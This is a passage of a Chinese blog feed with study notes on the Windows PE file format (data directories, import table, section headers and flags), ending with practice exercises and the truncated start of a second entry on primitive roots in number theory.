class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   <span class="comment">// RVA of GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   <span class="comment">// 重点:TLS Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   <span class="comment">// 过时了:Load Configuration Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   <span class="comment">// 过时了:Bound Import Directory in headers</span></span></span><br><span class="line"><span class="comment">// 早期Window是为了装载常用API,就将API地址固定了,但是由于OS更新比较快,每次更新地址会变,就出现问题,所以之后该文件就废弃了</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   <span class="comment">// 重点:IAT表 Import Address Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   <span class="comment">// Delay Load Import Descriptors</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   <span class="comment">// COM Runtime descriptor</span></span></span><br></pre></td></tr></table></figure><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703183738734.png" alt="image-20250703183738734"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703183922862.png" alt="image-20250703183922862"></p><h4 id="导入表image_directory_entry_import">导入表(IMAGE_DIRECTORY_ENTRY_IMPORT)</h4><ul><li><p>最复杂的一个数据目录。</p></li><li><p>导入表的作用如下：</p><ul><li>当程序运行的时候，有时需要调用外部接口，尤其是<code>操作系统API</code>。有点类似于<code>ELF</code>文件中的<code>got表</code>。</li><li>当操作系统装载我们的可执行文件时，操作系统首先会分析可执行文件需要哪些库。接着分析需要这些库的哪些函数，将需要调用的函数地址，填入到操作系统和编译器约定好的位置。</li><li>编译器在编译好代码的时候，运行该程序，该程序在调用操作系统的相关<code>API</code>的时候就会到约定好的地址对这个<code>API</code>进行间接的反问。</li><li>而操作系统与应用程序约定好填入<code>API</code>的位置被称为<strong>Import Address Table简称IAT</strong>，调用<code>API</code>的地址是不固定的。</li></ul></li><li><p>导入表需要记录俩个东西<code>函数对应的动态库</code>、<code>动态库中的具体函数</code>（这两者的关系就相当于学生和班级这一数据关系，<code>一个动态库对应多个班级</code>）</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DIRECTORY_ENTRY_IMPORT; <span class="comment">//导入表</span></span><br><span class="line">IMAGE_IMPORY_DESCRIPTOR;  <span class="comment">//导入表子结构</span></span><br><span class="line">IMAGE_THUNK_DATA;    <span class="comment">//导入表子结构</span></span><br><span class="line">IMAGE_IMPORT_BY_NAME; <span class="comment">// 导入表子结构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入表中其实最先是IMAGE_IMPORY_DESCRIPTOR这个结构</span></span><br><span class="line"><span class="comment">// 存放动态库的信息,也就相当于学生与班级这一数据关系中的班级信息</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// 不太重要RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 不太重要0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// 不太重要-1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">// 不太重要in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// 不太重要O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// 不太重要-1 if no forwarders</span></span><br><span class="line">    DWORD   Name;<span class="comment">// 重要:动态库的名称</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// 重要:存放地址 RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><ul><li>在编译时，操作系统装载库函数的过程：<ul><li>首先遍历动态库信息，获得目标的库函数信息</li><li>然后读取函数信息表，将目标函数填入对应<code>IAT</code>结构体的中</li></ul></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703212813870.png" alt="image-20250703212813870"></p><ul><li>使用<code>xdbg</code>查看内存</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703213544177.png" alt="image-20250703213544177"></p><ul><li>通过<code>表的内存偏移</code>找到真实导入表</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703214019750.png" alt="image-20250703214019750"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703214044597.png" alt="image-20250703214044597"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703214109670.png" alt="image-20250703214109670"></p><ul><li>以下面张图片来将一下具体的过程：<ul><li>首先遍历第一个动态库的信息，先会找到库名称(图中阴影部分第一行最后<code>3A 22 00 00 </code>就是存储库函数名称的地址)</li><li>接着操作系统就会<code>载入相应的库</code>，如果载入失败，就会弹出缺少<code>.dll</code>依赖</li></ul></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703221053131.png" alt="image-20250703221053131"></p><ul><li>接着会根据<code>24 22 00 00</code>找到<code>对应偏移为24 22 00 00</code>的这个地方其实是一个数组，存放着被引用函数的信息，但是这里由于我们只使用了<code>第一个库中的第一个函数</code>，所以这里的数组长度就为1。</li><li>如果多个的话，就会有很多项直到<code>00 00 00 00 </code>结尾，之后<code>2c 22 00 00 </code>就会定位到<code>_IMAGE_IMPORT_BY_NAME</code>结构体</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703220526477.png" alt="image-20250703220526477"></p><ul><li>之后就是这样的一个数据，该数据其实就是如下结构体<ul><li><code>WORD Hint</code>不是很重要，仅供参考</li><li><code>CHAR Name[1]</code>其实是一个可变长数组，存放的是函数的名称</li><li>这样我们就拿到了函数名称，拿到函数名就可以得到函数对应的地址，得到函数对应地址后</li></ul></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703215556833.png" alt="image-20250703215556833"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703215953330.png" alt="image-20250703215953330"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250703220229783.png" alt="image-20250703220229783"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><h4 id="导出表image_directoryt_entry_export">导出表(IMAGE_DIRECTORYT_ENTRY_EXPORT)</h4><h4 id="导入地址表import-address-table">导入地址表(Import Address Table)</h4><h3 id="nt_optional_hdr64">NT_OPTIONAL_HDR64</h3><h3 id="rom_optional_hdr">ROM_OPTIONAL_HDR</h3><h2 id="段头">段头</h2><ul><li><code>PE</code>文件头的这个位置其实就是段头的位置，先来看一下每个段头的结构</li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250702204723216.png" alt="image-20250702204723216"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果要确定段头,需要先找数据目录</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 0x00段名如:.text 、.rdata、.data、.rsrc、.reloc,类似于注释,描述该节是做什么的(段名称可以重复,也可以乱写)</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">DWORD PhysicalAddress;<span class="comment">// 仅用于某些平台，现在常使用 VirtualSize</span></span><br><span class="line">DWORD VirtualSize;<span class="comment">// 0x08 节的实际大小(而不是节头的大小)</span></span><br><span class="line"> &#125; Misc;</span><br><span class="line">DWORD VirtualAddress;<span class="comment">// 0xC 相对虚拟地址</span></span><br><span class="line">DWORD SizeOfRawData;<span class="comment">// 0x10 需要载入内存的数据总大小,文件描述与NT可选头中FileAlignment对应</span></span><br><span class="line">DWORD PointerToRawData;<span class="comment">// 0x14 节数据在文件中的偏移地址 </span></span><br><span class="line">DWORD PointerToRelocations;<span class="comment">// 0x18 重定位的信息 (为兼容其他系统所做)</span></span><br><span class="line">DWORD PointerToLinenumber;<span class="comment">// 0x1c 行信息(为兼容其他系统所做)</span></span><br><span class="line">WORD NumberOfRelocations;<span class="comment">// 0x20 重定位总数(为兼容其他系统所做)</span></span><br><span class="line">WORD NumberOfLinenumbers;<span class="comment">// 0x24 行总数(为兼容其他系统所做)</span></span><br><span class="line">DWORD Characteristics;<span class="comment">// 0x28 内存属性,可读、可写、可执行、可共享是位描述W、R、E、S</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><ul><li>使用<code>.text</code>段来分析一下这个结构体，结合着下面内存映射的来解读一下<code>.text</code>段载入内存<ul><li>首先是名为<code>.text</code>段的一个段，会从文件偏移<code>0x400</code>的位置将数据载入到内存<code>相对地址为0x1000</code>的位置，载入实际有效的数据为<code>0x27</code>个字节(实际上载入总数是0x200字节即<code>SizeOfRawData</code>的大小)</li><li>并且内存要满足与<code>NT可选头中的SectionAlignment对齐</code></li><li>而<code>VirtualSize</code>这里面的数据是半说明性质的（可以适当修改）</li><li>然后给该内存段<code>可执行、可读</code>的权限</li></ul></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250702205544398.png" alt="image-20250702205544398"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250702212827539.png" alt="image-20250702212827539"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250702210926335.png" alt="image-20250702210926335"></p><h3 id="virtualaddress">VirtualAddress</h3><ul><li>存储着是文件中的<code>各个Section段</code>载入到内存后的起始偏移地址。所以在内存中的地址应该是这样计算。并且文件载入到内存中每一段的大小需要与<strong>NT可选头的</strong><code>SectionAlignment</code>里面的值对齐</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">绝对地址 = VirtualAddress + Image_Base(但是Image_Base不可信这里需要注意)</span><br></pre></td></tr></table></figure><h3 id="characteristics">Characteristics</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">R 可读   </span><br><span class="line">W 可写 </span><br><span class="line">E 可执行</span><br><span class="line">S 可共享</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_DISCARDABLE            0x02000000  <span class="comment">// Section can be discarded.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_NOT_CACHED             0x04000000  <span class="comment">// Section is not cachable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_NOT_PAGED              0x08000000  <span class="comment">// Section is not pageable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_SHARED                 0x10000000  <span class="comment">// Section is shareable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_EXECUTE                0x20000000  <span class="comment">// Section is executable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_READ                   0x40000000  <span class="comment">// Section is readable.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_WRITE                  0x80000000  <span class="comment">// Section is writeable.</span></span></span><br><span class="line"><span class="comment">// 可读可写可执行不可共享其实就是将这些位坐或运算 0x20000000 | 0x40000000 | 0x80000000</span></span><br><span class="line"><span class="comment">// Characteristics字段可以改，但是需要适当的改</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//下面的是 Characteristic的其他宏定义,了解即可</span></span><br><span class="line"><span class="comment">// Section characteristics.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_REG                   0x00000000  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_DSECT                 0x00000001  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_NOLOAD                0x00000002  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_GROUP                 0x00000004  // Reserved.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_TYPE_NO_PAD                0x00000008  <span class="comment">// Reserved.</span></span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_COPY                  0x00000010  // Reserved.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_CNT_CODE                   0x00000020  <span class="comment">// Section contains code.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_CNT_INITIALIZED_DATA       0x00000040  <span class="comment">// Section contains initialized data.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_CNT_UNINITIALIZED_DATA     0x00000080  <span class="comment">// Section contains uninitialized data.</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_OTHER                  0x00000100  <span class="comment">// Reserved.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_INFO                   0x00000200  <span class="comment">// Section contains comments or some other type of information.</span></span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_TYPE_OVER                  0x00000400  // Reserved.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_REMOVE                 0x00000800  <span class="comment">// Section contents will not become part of image.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_COMDAT                 0x00001000  <span class="comment">// Section contents comdat.</span></span></span><br><span class="line"><span class="comment">//                                           0x00002000  // Reserved.</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_MEM_PROTECTED - Obsolete   0x00004000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_NO_DEFER_SPEC_EXC          0x00004000  <span class="comment">// Reset speculative exceptions handling bits in the TLB entries for this section.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_GPREL                      0x00008000  <span class="comment">// Section content can be accessed relative to GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_FARDATA                0x00008000</span></span><br><span class="line"><span class="comment">//      IMAGE_SCN_MEM_SYSHEAP  - Obsolete    0x00010000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_PURGEABLE              0x00020000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_16BIT                  0x00020000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_LOCKED                 0x00040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_MEM_PRELOAD                0x00080000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_1BYTES               0x00100000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_2BYTES               0x00200000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_4BYTES               0x00300000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_8BYTES               0x00400000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_16BYTES              0x00500000  <span class="comment">// Default alignment if no others are specified.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_32BYTES              0x00600000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_64BYTES              0x00700000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_128BYTES             0x00800000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_256BYTES             0x00900000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_512BYTES             0x00A00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_1024BYTES            0x00B00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_2048BYTES            0x00C00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_4096BYTES            0x00D00000  <span class="comment">//</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_8192BYTES            0x00E00000  <span class="comment">//</span></span></span><br><span class="line"><span class="comment">// Unused                                    0x00F00000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_ALIGN_MASK                 0x00F00000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SCN_LNK_NRELOC_OVFL            0x01000000  <span class="comment">// Section contains extended relocations.</span></span></span><br></pre></td></tr></table></figure><h2 id="无效数据">无效数据</h2><ul><li>无效数据是为了对齐，所以在<code>PE</code>文件头写完了<code>DOS头</code>、<code>NT头</code>和<code>段头</code>之后如果程序偏移还没有到<code>0x400</code>，此时就需要使用无效数据<code>\x00</code>进行偏移操作。</li><li>之后从<code>0x400</code>开始其实就是存放着<code>段数据</code></li></ul><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701210829931.png" alt="image-20250701210829931"></p><h2 id="段数据">段数据</h2><h2 id="附加数据">附加数据</h2><h2 id="vs2022查看pe结构体">VS2022查看PE结构体</h2><ul><li>新建一个项目，编写如下代码，鼠标选中<code>IMAGE_DOS_HEADER</code>就可以跳转到对应结构体的定义中。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">IMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701183153887.png" alt="image-20250701183153887"></p><p><img src="/2025/08/08/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/image-20250701183329984.png" alt="image-20250701183329984"></p><h1 id="地址转换">地址转换</h1><h1 id="玩转导入表">玩转导入表</h1><h1 id="进阶">进阶</h1><ol><li>尝试自己编写一个小程序，试着修改一些无关值，查看程序能不能正常执行。</li><li>尝试编写一个像<code>CFF</code>这样的界面，可以读取查看<code>PE</code>文件头结构，还可以<code>修改</code>。</li><li>尝试修改<code>DOS</code>那边的<code>stub</code>部分，使得某个简单的程序能在<code>DOS</code>环境下也能实现功能。</li><li>尝试添加一个节头，该节用于注入操作(添加节头即可，注入的代码后面再说)<strong>三步走</strong><ul><li>第一步添加新节描述</li><li>第二步添加新节数据</li><li>修改NT可选头中的<code>SizeOfImage</code>、修改节表总数即修改NT头中的<code>NumberOfSections</code>的个数</li></ul></li><li>添加一个没有文件映射的节头即未初始化数据，对应高级语言中的未初始化的全局变量，以及汇编中的<code>.data?</code></li><li>添加一个变形的未初始化区，即在文件中的数据<code>小于等于0x200</code>，但是映射到内存映射<code>0x2000</code>字节大小</li><li>写一个类似<code>CFF</code>中能自动计算文件偏移，并且可以自动定位数据的程序，可以作为<code>2.</code>程序中的功能</li><li>尝试修改导入表，进行<code>.dll</code>hook操作</li></ol>]]></content>
    
    
    <summary type="html">前言：大三有逆向课，现在也学点吧</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="REVERSE" scheme="http://iyheart.github.io/categories/CTF/REVERSE/"/>
    
    
  </entry>
  
  <entry>
    <title>数论基础-原根与指标</title>
    <link href="http://iyheart.github.io/2025/08/05/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E5%8E%9F%E6%A0%B9%E4%B8%8E%E6%8C%87%E6%A0%87/"/>
    <id>http://iyheart.github.io/2025/08/05/%E6%95%B0%E5%AD%A6blog/%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80-%E5%8E%9F%E6%A0%B9%E4%B8%8E%E6%8C%87%E6%A0%87/</id>
    <published>2025-08-05T15:54:31.000Z</published>
    <updated>2025-08-21T07:35:12.569Z</updated>
    
    <content type="html"><![CDATA[<h1 id="指数及其基本性质">指数及其基本性质</h1><blockquote><p><strong>定义1</strong>：</p><p>若$m&gt;1,(a,m)=1$，则使得同余式$a^{\gamma}\equiv1~mod(~m)$，成立的最小正整数$\gamma$叫做a对模m的<strong>指数</strong>。若a对模m的指数等于$\phi(m)$，则a叫做模m的一个<strong>原根</strong></p><p>注意1：指数总是存在的，但原根可能不存在。因为由欧拉定理$\forall a\in Z,(a,m)=1$，有$a^{\phi(m)}\equiv 1~(mod~m)$，总是能找到一个数，但这个数不一定是原根，但一定是原根的整数倍</p><p>注意2：原根是底数对模数的概念，满足条件的最小正整数才叫指数，而不是放在头上的都叫指数。</p></blockquote><blockquote><p><strong>定理1</strong>：</p><p>若a对模m的指数是$\delta$，则$1=a^{0},a^{1},…,a^{\delta-1}$对模m两两不同余。</p><p><strong>定理2</strong>：</p><p>若a对模m的指数为$\delta$，则$a^{\gamma}\equiv a^{\gamma’}~(mod~m)$的充分必要条件是$r\equiv r’~(mod~\delta)$，特别地，当$a^{\delta}\equiv1~(mod~m)$的充分必要条件是$\delta\mid r$</p><p><strong>推论1</strong>：</p><p>若a对模m的指数是$\delta$，则$\delta \mid\phi(m)$</p><p><strong>推论2</strong>：</p><p>设$0&lt;a&lt;b,(a,b)=1,b=2^{\alpha}5^{\beta}b_1,(b_1,10)=1,b_1\not\equiv1$，若将有理数$\frac{a}{b}$化成循环小数，则此循环小数的循环节的长度$\delta \mid \phi(b_1)$</p><p><strong>定理3</strong>:</p><p>若x对模m的指数是ab，$a&gt;0,b&gt;0$，则$x^{a}$对模m的指数是b</p><p><strong>定理4</strong>：</p><p>若x对模m的指数是a，y对模m的指数是b，并且$(a,b)=1$，则xy对模m的指数是ab。</p></blockquote><h1 id="原根存在的条件">原根存在的条件</h1><blockquote><p><strong>命题1</strong>：</p><p>设$a,m&gt;1$都是整数，$a=mq+r$，则a对模m的指数等于对模m的指数</p><p><strong>推论1</strong>：</p><p>若$a\equiv 